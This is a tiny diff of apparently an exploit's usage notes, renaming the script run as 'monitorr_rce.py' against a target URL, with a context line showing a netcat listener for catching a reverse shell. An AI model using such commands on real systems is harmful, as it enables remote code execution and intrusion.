@@ -13,4 +13,4 @@
 ``rlwrap nc -lvnp 443``
 
 ### Exploit
-``python exploit.py https://domain.com LHOST PORT``
+``python monitorr_rce.py https://domain.com LHOST PORT``
